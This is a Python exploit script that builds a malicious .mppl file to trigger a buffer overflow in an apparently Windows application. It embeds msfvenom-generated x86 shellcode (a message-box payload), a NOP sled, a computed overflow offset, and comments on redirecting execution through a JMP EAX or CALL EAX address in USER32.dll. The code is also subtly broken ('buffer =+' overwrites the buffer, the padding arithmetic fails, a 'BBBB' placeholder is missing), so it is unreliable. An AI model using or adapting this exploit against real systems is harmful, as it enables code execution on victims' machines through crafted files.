#!/usr/bin/python

file = open("exploit.mppl", "wb")

# msfvenom -p windows/messagebox -f c -a x86 -b "\x00\x0a\x0d"
shellcode = ("\xbd\x83\xaf\x84\xbe\xdd\xc4\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x45\x31\x68\x12\x03\x68\x12\x83\x6b\x53\x66\x4b\xb2\x47\xfc"
"\x6d\x30\xbc\xf7\xbf\x6a\x0e\x80\x8e\x43\x0b\xe4\x80\x63\x5f"
"\x8c\x6e\x08\x29\x6d\xe4\x48\xde\x06\x84\x74\x55\x2e\x41\x3b"
"\x71\x3a\x42\x9a\x80\x15\x5b\xfd\xe3\x1e\xc8\xd9\xc7\xab\x54"
"\x1d\x83\xf8\x7e\x25\x92\xea\xf4\x9f\x8c\x61\x50\x3f\xac\x9e"
"\x86\x0b\xe7\xeb\x7d\xf8\xf6\x05\x4c\x01\xc9\x19\x53\x51\xae"
"\x5a\xd8\xae\x6e\x95\x2c\xb1\xb7\xc1\xdb\x8a\x4b\x32\x0c\x99"
"\x52\xb1\x16\x45\x94\x2d\xc0\x0e\x9a\xfa\x86\x4a\xbf\xfd\x73"
"\xe1\xbb\x76\x82\x1d\x4a\xcc\xa1\xc1\x2c\x0e\x1b\xf1\x87\x44"
"\xd5\xe4\x51\xa6\x8e\x68\x2f\x29\xa3\x26\x58\xaa\xc4\x39\x67"
"\x5c\x7f\xc1\x23\x21\x58\x2b\x20\x59\x44\x8f\x95\x8d\xfb\x30"
"\xe6\xb1\x8d\x8b\x11\x26\xe2\x7f\x02\xf7\x92\x4c\x70\xd9\x06"
"\xda\x01\x56\xa2\x68\xda\x43\xa4\xd0\x3e\x7e\x3c\x0e\x68\x81"
"\x6b\xca\x1c\xbf\xc4\x69\xb6\xe2\xa8\x31\x40\xfe\x16\x1b\xa7"
"\xa0\xa9\x64\xc8\x37\x39\xe2\x6f\xe8\xad\x73\xf7\x8d\x6f\x1b"
"\xba\x28\x03\xa8\x75\x68\x6b\x12\x52\x84\xe5\x49\xf2\xc0\xd5"
"\xad\x23\x99\x58\xfe\x65\x78\x0b\x72\x05\x17\xeb\x1a\xb6\xcb"
"\xcb\xbc\x20\x5c\x69\x2c\xdd\x6d\xb8\x24\x51\xaa\x2a\xbd\x8b"
"\x83\x98\xef\x18\xb5\x4e\xf0\x4f\x04\xaf\x5e\x8f\x32\x27")

# ./pattern_offset.rb -q 71423571
# [*] Exact match at offset 1276

buffer = "A" * 1276

buffer += "\x90" * 24

buffer += shellcode

buffer += "\x90" * ( 1276 - len(buffer) )

"""
Run the program
View -> Executable Modules -> USER32.dll
Search for -> Command -> JMP EAX (OR) CALL EAX -> Note the address
Here EAX is used instead of ESP because the pattern is overwriting the EAX location rather than ESP
Replace BBBB with the address
This address will jump back to where the shellcode is located
"""

buffer =+ "\x66\xe8\x41\x7e"

file.write(buffer)

file.close()
